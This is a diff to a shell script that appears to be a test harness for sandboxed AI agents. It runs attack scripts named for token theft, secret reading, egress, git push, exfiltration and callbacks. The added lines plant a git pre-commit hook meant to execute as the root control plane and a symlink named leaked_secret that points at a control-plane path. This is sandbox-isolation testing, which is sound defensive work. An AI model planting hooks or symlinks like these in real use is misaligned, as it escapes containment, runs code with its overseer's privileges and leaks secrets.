@@ -14,3 +14,12 @@ printf 'agent (rung%s) was here\n' "${RUNG:-?}" >> "${WORKDIR:?}/hello.txt"
 for a in a1_env_token a2_secret_at_rest a3_egress a4_git_push a5_exfil a6_callback; do
   bash "${ATTACKS_DIR:?}/${a}.sh"
 done
+
+# --- return-path attacks: plant payloads for the control plane to ingest on
+# harvest. Verified by the control plane afterwards (R1/R2). The hook would run
+# as the control plane (root) on `git commit`; the symlink would smuggle a path
+# into the committed tree.
+mkdir -p "$WORKDIR/.git/hooks"
+printf '#!/bin/sh\nid > "%s"\n' "${PWNED_MARKER:?}" > "$WORKDIR/.git/hooks/pre-commit"
+chmod +x "$WORKDIR/.git/hooks/pre-commit"
+ln -s "${CP_HINTS%%:*}" "$WORKDIR/leaked_secret" 2>/dev/null || true
